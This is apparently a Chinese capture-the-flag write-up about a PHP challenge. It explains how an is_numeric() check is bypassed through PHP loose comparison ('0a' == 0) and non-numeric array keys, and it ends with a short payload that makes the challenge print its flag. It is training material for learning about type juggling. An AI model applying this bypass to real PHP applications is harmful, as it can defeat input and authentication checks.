# 挺有趣的题目

<br>

## 先说一下is_numeric()的绕过


   is_numeric() 函数会判断如果是数字和数字字符串则返回 TRUE，否则返回 FALSE,且php中弱类型比较时，会使('1234a' == 1234)为真，或者'12345%00'


<br>

## 题目

````
<?php
highlight_file('final1l1l_challenge.php');
error_reporting(0);
include 'flag.php';

$a = $_GET['a'];
$b = $_POST['b'];
if (isset($a) && isset($b)) {
    if (!is_numeric($a) && !is_numeric($b)) {
        if ($a == 0 && md5($a) == $b[$a]) {
            echo $flag;
        } else {
            die('noooooooooooo');
        }
    } else {
        die( 'Notice the param type!');
    }
} else {
    die( 'Where is your param?');
} 
````
这里我们需要知道一个要点

数组的索引可以不是数字

<br>

## payload

````
a=0a
b[0a]=e99bb33727d338314912e86fbdec87af
````